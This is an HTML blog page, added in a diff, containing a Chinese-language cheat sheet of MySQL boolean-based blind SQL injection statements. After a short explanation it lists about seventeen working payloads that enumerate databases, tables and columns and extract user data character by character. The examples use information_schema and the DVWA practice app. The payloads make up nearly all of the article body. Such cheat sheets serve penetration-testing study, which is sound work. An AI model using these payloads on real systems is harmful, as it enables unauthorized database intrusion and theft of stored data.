@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>mysql基于布尔型盲注常用语句 | Damit5&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+    <meta name="keywords" content="damit5" />
+  
+  
+  
+  
+  <meta name="description" content="new APlayer({ 				element: document.getElementById(&quot;aplayer5&quot;), 				narrow: false, 				autoplay: true, 				showlrc: 0, 				music: { 					title: &quot;六月的雨&quot;, 					author: &quot;胡歌&quot;, 					url: &quot;https://dam">
+<meta name="keywords" content="渗透测试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MySQL基于布尔型盲注常用语句">
+<meta property="og:url" content="https://damit5.com/2017/11/26/MySQL基于布尔型盲注常用语句/index.html">
+<meta property="og:site_name" content="Damit5&#39;s Blog">
+<meta property="og:description" content="new APlayer({ 				element: document.getElementById(&quot;aplayer5&quot;), 				narrow: false, 				autoplay: true, 				showlrc: 0, 				music: { 					title: &quot;六月的雨&quot;, 					author: &quot;胡歌&quot;, 					url: &quot;https://dam">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2018-02-28T13:01:49.160Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="MySQL基于布尔型盲注常用语句">
+<meta name="twitter:description" content="new APlayer({ 				element: document.getElementById(&quot;aplayer5&quot;), 				narrow: false, 				autoplay: true, 				showlrc: 0, 				music: { 					title: &quot;六月的雨&quot;, 					author: &quot;胡歌&quot;, 					url: &quot;https://dam">
+  
+    <link rel="alternate" href="/atom.xml" title="Damit5&#39;s Blog" type="application/atom+xml">
+  
+
+  
+
+  <link rel="icon" href="/css/images/favicon.png">
+  <link rel="apple-touch-icon" href="/css/images/favicon.png">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
+  <link rel="stylesheet" href="/css/style.css">
+
+  <script src="/js/jquery-3.1.1.min.js"></script>
+  <script src="/js/bootstrap.js"></script>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+
+  
+    <link rel="stylesheet" href="/css/dialog.css">
+  
+
+  
+
+  
+    <link rel="stylesheet" href="/css/header-post.css" >
+  
+
+  
+  
+  
+
+</head>
+
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+  <div id="container">
+    <div id="wrap">
+      
+        <header>
+
+    <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
+        <div class="navbar-inner">
+          
+          <div class="container"> 
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+              <span class="sr-only">Toggle navigation</span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+
+            
+              <a class="brand" style="
+                 margin-top: 0px;"  
+                href="#" data-toggle="modal" data-target="#myModal" >
+                  <img width="124px" height="124px" alt="Hike News" src="/css/images/favicon.png">
+              </a>
+            
+            
+            <div class="navbar-collapse collapse">
+              <ul class="hnav navbar-nav">
+                
+                  <li> <a class="main-nav-link" href="/">Home</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/archives">Archives</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/tags">Tags</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/About">About</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/Link">link</a> </li>
+                
+                  <li><div id="search-form-wrap">
+
+    <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="index.search"><button type="submit" class="search-form-submit"> </button><input type="hidden" name="sitesearch" value="https://damit5.com"></form>
+
+</div></li>
+            </div>
+          </div>
+                
+      </div>
+    </div>
+
+</header>
+
+
+
+      
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-MySQL基于布尔型盲注常用语句" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      MySQL基于布尔型盲注常用语句
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2017/11/26/MySQL基于布尔型盲注常用语句/" class="article-date">
+	  <time datetime="2017-11-26T02:28:02.000Z" itemprop="datePublished">2017-11-26</time>
+	</a>
+
+      
+      
+	<a class="article-views">
+	<span id="busuanzi_container_page_pv">
+		PV:<span id="busuanzi_value_page_pv"></span>
+	</span>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <script src="/assets/js/APlayer.min.js"> </script><div id="aplayer5" class="aplayer" style="margin-bottom: 20px;"></div>
+		<script>
+			new APlayer({
+				element: document.getElementById("aplayer5"),
+				narrow: false,
+				autoplay: true,
+				showlrc: 0,
+				music: {
+					title: "六月的雨",
+					author: "胡歌",
+					url: "https://damit5.github.io/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",
+					pic: "https://damit5.github.io/Music/233.jpg",
+				}
+			});
+		</script>
+<h3 id="什么是盲注？"><a href="#什么是盲注？" class="headerlink" title="什么是盲注？"></a>什么是盲注？</h3><p>基于布尔型SQL盲注即在SQL注入过程中，应用程序仅仅返回True（页面）和False（页面）。<br>这时，我们无法根据应用程序的返回页面得到我们需要的数据库信息。但是可以通过构造逻辑判断（比较大小）来得到我们需要的信息。</p>
+<a id="more"></a>
+<h3 id="常用语句汇总"><a href="#常用语句汇总" class="headerlink" title="常用语句汇总"></a>常用语句汇总</h3><hr>
+<h4 id="查询所有数据库"><a href="#查询所有数据库" class="headerlink" title="查询所有数据库"></a>查询所有数据库</h4><h5 id="1-判断表存不存在"><a href="#1-判断表存不存在" class="headerlink" title="1.判断表存不存在"></a>1.判断表存不存在</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and  exists(select * from information_schema.tables)</div></pre></td></tr></table></figure>
+<h5 id="2-判断存在多少个库"><a href="#2-判断存在多少个库" class="headerlink" title="2.判断存在多少个库"></a>2.判断存在多少个库</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and  (select count(distinct+table_schema) from information_schema.tables)&gt;4</div></pre></td></tr></table></figure>
+<h5 id="3-判断库名的长度"><a href="#3-判断库名的长度" class="headerlink" title="3.判断库名的长度"></a>3.判断库名的长度</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and (select length(table_schema) from information_schema.tables limit 0,1) &gt;17</div></pre></td></tr></table></figure>
+<h5 id="4-接下来爆每个库的库名"><a href="#4-接下来爆每个库的库名" class="headerlink" title="4.接下来爆每个库的库名"></a>4.接下来爆每个库的库名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and  (select ascii(substr((select distinct table_schema from information_schema.tables limit 0,1),1,1)))&gt;104</div></pre></td></tr></table></figure>
+<h5 id="5-猜表，首先判断表的长度"><a href="#5-猜表，首先判断表的长度" class="headerlink" title="5.猜表，首先判断表的长度"></a>5.猜表，首先判断表的长度</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and (select length(table_name) from information_schema.tables where table_schema=&apos;information_schema&apos; limit 0,1) &gt;13</div></pre></td></tr></table></figure>
+<h5 id="6-判断完表的长度之后就要开始猜解表的字符"><a href="#6-判断完表的长度之后就要开始猜解表的字符" class="headerlink" title="6.判断完表的长度之后就要开始猜解表的字符"></a>6.判断完表的长度之后就要开始猜解表的字符</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and (select ascii(substr((select table_name from information_schema.tables where table_schema=&apos;information_schema&apos; limit 0,1),1,1))) &gt;66</div></pre></td></tr></table></figure>
+<h5 id="7-再接下来猜解表里边的字段即列-首先统计一下有多少个字段"><a href="#7-再接下来猜解表里边的字段即列-首先统计一下有多少个字段" class="headerlink" title="7.再接下来猜解表里边的字段即列,首先统计一下有多少个字段"></a>7.再接下来猜解表里边的字段即列,首先统计一下有多少个字段</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and (select count(column_name) from information_schema.columns where table_schema=&apos;information_schema&apos; and table_name=&apos;CHARACTER_SETS&apos; ) &gt;4</div></pre></td></tr></table></figure>
+<h5 id="8-判断每个字段的长度"><a href="#8-判断每个字段的长度" class="headerlink" title="8.判断每个字段的长度"></a>8.判断每个字段的长度</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and (select length(column_name) from information_schema.columns where table_schema=&apos;information_schema&apos; and table_name=&apos;CHARACTER_SETS&apos; limit 0,1 ) &gt;17</div></pre></td></tr></table></figure>
+<h5 id="9-接下来猜第一个字段的字符"><a href="#9-接下来猜第一个字段的字符" class="headerlink" title="9.接下来猜第一个字段的字符"></a>9.接下来猜第一个字段的字符</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and (select ascii(substr((select column_name from information_schema.columns where table_schema=&apos;information_schema&apos; and table_name=&apos;CHARACTER_SETS&apos; limit 0,1),1,1)) ) &gt;66</div></pre></td></tr></table></figure>
+<hr>
+<h4 id="查询当前数据库"><a href="#查询当前数据库" class="headerlink" title="查询当前数据库"></a>查询当前数据库</h4><h5 id="1-查询数据库的长度"><a href="#1-查询数据库的长度" class="headerlink" title="1.查询数据库的长度"></a>1.查询数据库的长度</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and length(database()) &gt; 4</div></pre></td></tr></table></figure>
+<h5 id="2-查询数据库名"><a href="#2-查询数据库名" class="headerlink" title="2.查询数据库名"></a>2.查询数据库名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and ascii(substr((select database()),1,1)) &gt; 99</div></pre></td></tr></table></figure>
+<h5 id="3-查询表名的长度"><a href="#3-查询表名的长度" class="headerlink" title="3.查询表名的长度"></a>3.查询表名的长度</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and (select(length(table_name)) from information_schema.tables where table_schema = 0x64767761 limit 0,1) &gt; 8+--+</div></pre></td></tr></table></figure>
+<h5 id="4-查询表名"><a href="#4-查询表名" class="headerlink" title="4.查询表名"></a>4.查询表名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and ascii(substr((select table_name from information_schema.tables where table_schema=0x64767761 limit 1,1),1,1)) &gt; 116</div></pre></td></tr></table></figure>
+<h5 id="5-查询列名的长度"><a href="#5-查询列名的长度" class="headerlink" title="5.查询列名的长度"></a>5.查询列名的长度</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and (select(length(column_name)) from information_schema.columns where table_name = 0x7573657273 limit 0,1) &gt; 6</div></pre></td></tr></table></figure>
+<h5 id="6-查询列名"><a href="#6-查询列名" class="headerlink" title="6.查询列名"></a>6.查询列名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 0,1),1,1)) &gt; 116</div></pre></td></tr></table></figure>
+<h5 id="7-查询字段的长度"><a href="#7-查询字段的长度" class="headerlink" title="7.查询字段的长度"></a>7.查询字段的长度</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and (select length(column_name) from information_schema.columns where table_name=0x7573657273 limit 1,1 ) &gt;10</div></pre></td></tr></table></figure>
+<h5 id="8-爆出字段"><a href="#8-爆出字段" class="headerlink" title="8.爆出字段"></a>8.爆出字段</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and ascii(substr((select user from dvwa.users limit 0,1),1,1)) &gt; 96</div></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+        
+	<div id="comment">
+		<!-- 来必力City版安装代码 -->
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
+		<script type="text/javascript">
+		   (function(d, s) {
+		       var j, e = d.getElementsByTagName(s)[0];
+
+		       if (typeof LivereTower === 'function') { return; }
+
+		       j = d.createElement(s);
+		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+		       j.async = true;
+
+		       e.parentNode.insertBefore(j, e);
+		   })(document, 'script');
+		</script>
+		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+		</div>
+		<!-- City版安装代码已完成 -->
+	</div>
+
+
+
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透测试/">渗透测试</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/12/11/Tkinter-学习笔记/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Tkinter 学习笔记
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/11/22/Microsoft-Office内存损坏漏洞（CVE–2017–11882-复现/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Microsoft Office内存损坏漏洞（CVE–2017–11882) 复现</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="toc-sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是盲注？"><span class="nav-number">1.</span> <span class="nav-text">什么是盲注？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常用语句汇总"><span class="nav-number">2.</span> <span class="nav-text">常用语句汇总</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#查询所有数据库"><span class="nav-number">2.1.</span> <span class="nav-text">查询所有数据库</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-判断表存不存在"><span class="nav-number">2.1.1.</span> <span class="nav-text">1.判断表存不存在</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-判断存在多少个库"><span class="nav-number">2.1.2.</span> <span class="nav-text">2.判断存在多少个库</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-判断库名的长度"><span class="nav-number">2.1.3.</span> <span class="nav-text">3.判断库名的长度</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-接下来爆每个库的库名"><span class="nav-number">2.1.4.</span> <span class="nav-text">4.接下来爆每个库的库名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-猜表，首先判断表的长度"><span class="nav-number">2.1.5.</span> <span class="nav-text">5.猜表，首先判断表的长度</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6-判断完表的长度之后就要开始猜解表的字符"><span class="nav-number">2.1.6.</span> <span class="nav-text">6.判断完表的长度之后就要开始猜解表的字符</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#7-再接下来猜解表里边的字段即列-首先统计一下有多少个字段"><span class="nav-number">2.1.7.</span> <span class="nav-text">7.再接下来猜解表里边的字段即列,首先统计一下有多少个字段</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#8-判断每个字段的长度"><span class="nav-number">2.1.8.</span> <span class="nav-text">8.判断每个字段的长度</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#9-接下来猜第一个字段的字符"><span class="nav-number">2.1.9.</span> <span class="nav-text">9.接下来猜第一个字段的字符</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查询当前数据库"><span class="nav-number">2.2.</span> <span class="nav-text">查询当前数据库</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-查询数据库的长度"><span class="nav-number">2.2.1.</span> <span class="nav-text">1.查询数据库的长度</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-查询数据库名"><span class="nav-number">2.2.2.</span> <span class="nav-text">2.查询数据库名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-查询表名的长度"><span class="nav-number">2.2.3.</span> <span class="nav-text">3.查询表名的长度</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-查询表名"><span class="nav-number">2.2.4.</span> <span class="nav-text">4.查询表名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-查询列名的长度"><span class="nav-number">2.2.5.</span> <span class="nav-text">5.查询列名的长度</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6-查询列名"><span class="nav-number">2.2.6.</span> <span class="nav-text">6.查询列名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#7-查询字段的长度"><span class="nav-number">2.2.7.</span> <span class="nav-text">7.查询字段的长度</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#8-爆出字段"><span class="nav-number">2.2.8.</span> <span class="nav-text">8.爆出字段</span></a></li></ol></li></ol></li></ol>
+    
+    </div>
+  </aside>
+</section>
+        
+      </div>
+      
+      <footer id="footer">
+  
+
+  <div class="container">
+      	<div class="row">
+	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
+	      <p id="copyRightEn">Copyright &copy; 2017 - 2018 Damit5&#39;s Blog All Rights Reserved.</p>
+	      
+	      
+    		<p class="busuanzi_uv">
+				UV : <span id="busuanzi_value_site_uv"></span> |  
+				PV : <span id="busuanzi_value_site_pv"></span>
+		    </p>
+  		   
+		</div>
+
+		
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+    var allheader = document.getElementById("allheader");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
+    if (allheader != null) {
+      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    } else {
+      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    }
+</script>
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/About" class="mobile-nav-link">About</a>
+  
+    <a href="/Link" class="mobile-nav-link">Link</a>
+  
+</nav> -->
+    
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/scripts.js"></script>
+
+
+
+
+  <script src="/js/dialog.js"></script>
+
+
+
+
+
+
+
+
+	<div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+  </div>
+
+
+
+	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+	</script>
+
+
+
+
+
+
+  </div>
+
+  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title" id="myModalLabel">设置</h2>
+      </div>
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+
+
+      <div class="modal-body">
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
+              正文字号大小
+            </a>
+          </div>
+          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
+          <div class="panel-body">
+            您已调整页面字体大小
+          </div>
+        </div>
+      
+
+
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
+              夜间护眼模式
+            </a>
+        </div>
+          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
+          <div class="panel-body">
+            夜间模式已经开启，再次单击按钮即可关闭 
+          </div>
+        </div>
+
+        <div>
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+        </div>
+         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
+          <div class="panel-body">
+            Damit5&#39;s Blog
+          </div>
+          <div class="panel-body">
+            Copyright © 2018 Damit 5 All Rights Reserved.
+          </div>
+        </div>
+      </div>
+
+
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <div class="modal-footer">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+      </div>
+    </div>
+  </div>
+</div>
+  
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+  
+    <a id="menu-switch"><i class="fa fa-bars fa-lg"></i></a>
+  
+</body>
+</html>
